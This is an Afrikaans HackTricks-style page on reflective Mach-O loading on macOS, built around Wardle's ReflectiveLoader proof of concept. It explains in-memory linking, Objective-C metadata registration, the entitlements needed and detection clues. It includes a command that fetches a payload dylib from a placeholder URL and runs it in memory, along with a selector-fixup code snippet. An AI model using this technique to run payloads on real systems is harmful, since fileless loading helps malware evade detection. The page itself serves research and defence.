# Reflective Mach-O Loading op macOS

{{#include ../../../banners/hacktricks-training.md}}

’n Reflective loader karteer ’n Mach-O-image vanaf grepe wat reeds in sy eie proses is, koppel dit dan en voer sy initialiseerders uit sonder om die stelselloader te vra om ’n payload-lêer oop te maak. Dit is **kode-uitvoering binne die proses**, nie ’n primitief vir privilegie-eskalasie of inspuiting in ’n afgeleë proses nie.<sup>[[2]](#references)</sup>

Op onlangse weergawes van macOS skryf die ou `NSCreateObjectFileImageFromMemory`/`NSLinkModule`-pad die image na skyf. ReflectiveLoader sluit eerder ouer Apple dyld-laaikode in; Wardle het dit op macOS 15 en 26 gedemonstreer.<sup>[[2]](#references)[[3]](#references)</sup>

As die loader die Hardened Runtime gebruik, benodig sy ongetekende kode in die geheue ’n uitsondering vir uitvoerbare geheue, soos `com.apple.security.cs.allow-unsigned-executable-memory` of `com.apple.security.cs.disable-executable-page-protection`; anders word uitvoering deur kode-ondertekeningsafdwinging geblokkeer. Dit is ’n ondertekeningsbeperking vir die loader, nie ’n eskalasieprimitief nie. Sien die [macOS-entitlements-verwysing](../macos-security-protections/macos-dangerous-entitlements.md#comapplesecuritycsallow-unsigned-executable-memory).<sup>[[2]](#references)</sup>

Vir die PoC, verskaf ’n URL wat ’n rou Mach-O **bundle, framework of dylib** bedien. Die `main.mm` daarvan verwerp leë aflaaie en meld dat payloads wat `LC_DYLD_CHAINED_FIXUPS` gebruik, nie ondersteun word nie. ’n Plaaslike padnaam word ook aanvaar, maar daardie invoer is nie ’n lêerlose werksvloei nie. Die URL-vorm lees grepe in `NSData` en gee sy buffer en lengte aan `custom_dlopen_from_memory` deur.<sup>[[4]](#references)</sup>

```bash
./PoC 'https://example.invalid/payload.dylib'
```

Die ingebedde loader roep `ImageLoaderMachO::instantiateFromMemory` aan, gevolg deur `image->link`. Dit registreer Objective-C-metadata **ná linking maar vóór** `image->runInitializers`, wat constructors uitvoer.<sup>[[5]](#references)</sup> Sonder registrasie kan ’n constructor wat ’n Objective-C-boodskap stuur, faal met `unrecognized selector sent to instance`.<sup>[[3]](#references)</sup> Sien [dyld se normale beeldlaaivloei](macos-library-injection/macos-dyld-process.md#flow) en die [Mach-O-afdelingsverwysing](../macos-files-folders-and-binaries/universal-binaries-and-mach-o-format.md#objective-c-common-sections).

## Aktivering van Objective-C-metadata

Anders as met normale dyld-laai, maak die inbedding van die ouer image loader nie die payload se Objective-C-metadata outomaties bruikbaar vir `libobjc` nie.<sup>[[3]](#references)</sup> Die aangepaste LLVM JIT-benadering skandeer die gekarteerde Objective-C-afdelings `__DATA` en `__DATA_CONST`, en voer dan hierdie stappe uit voordat constructors loop:<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>

1. Loop deur `__objc_selrefs` in stappe van `sizeof(SEL)`. Kry elke nie-null selector se naam met `sel_getName`, gee dit aan `sel_registerName` deur, en vervang die afdeling se wyser met die kanonieke `SEL`.
2. Versamel klasse uit `__objc_classlist` en registreer hulle met `objc_readClassPair`, nadat superclass-afhanklikhede eers opgelos is.
3. H herskryf verwysings in `__objc_classrefs` en `__objc_superrefs` na geregistreerde klasse of metaklasse, en heg kategoriemetodes vanaf `__objc_catlist` aan.

Byvoorbeeld, die selector-herstel in `ObjCRuntime.cpp` is gelykstaande aan:<sup>[[6]](#references)</sup>

```objectivec
for (uint8_t *cursor = sectionStart;
     cursor < sectionStart + selRefsSectionSize;
     cursor += sizeof(SEL)) {
    SEL *selector = (SEL *)cursor;
    if (*selector == NULL) continue;
    *selector = sel_registerName(sel_getName(*selector));
}
```

Die PoC maak staat op interne gedrag van die Objective-C-runtime en ondersteun nie elke Mach-O-formaatkenmerk nie; daarom is die registrasiekode ’n implementeringsverwysing eerder as ’n generiese laaier wat direk gebruik kan word. Registrasie is nodig vir Apple-klasse en -metodes waarna verwys word, sowel as klasse wat deur die payload gedefinieer word.<sup>[[1]](#references)[[4]](#references)[[6]](#references)</sup> <sup>[[3]](#references)</sup>

In die outeur se toetse verskyn ’n beeld wat reflektief gelaai is nie in `dyld_all_image_infos` nie. Die anonieme uitvoerbare memory mappings kan eerder as naamlose `dylib`-streke in `vmmap` verskyn; gemonsterde stapelrame kan as `<unknown binary>` vertoon word. Dit is leidrade vir inspeksie, nie ’n betroubare manier om dit aan hierdie laaier toe te skryf nie. Toegang tot ’n ander proses se taak-inligting word deur entitlements beperk. Sien [macOS memory dumping](../macos-files-folders-and-binaries/macos-memory-dumping.md) vir beperkings op prosestoegang.<sup>[[3]](#references)</sup>

## References

- [1] [LLVM JIT, Objective-C en Swift op macOS: kennisversameling](https://stanislaw.github.io/2018-09-03-llvm-jit-objc-and-swift-knowledge-dump.html)
- [2] [Herstel van Reflective Code Loading op macOS (Deel I)](https://objective-see.org/blog/blog_0x7C.html)
- [3] [Herstel van Reflective Code Loading op macOS (Deel II)](https://objective-see.org/blog/blog_0x82.html)
- [4] [ReflectiveLoader PoC main.mm](https://github.com/pwardle/ReflectiveLoader/blob/main/PoC/PoC/main.mm)
- [5] [ReflectiveLoader custom_dlfcn.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/custom_dlfcn.cpp)
- [6] [ReflectiveLoader ObjCRuntime.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/ObjCRuntime.cpp)
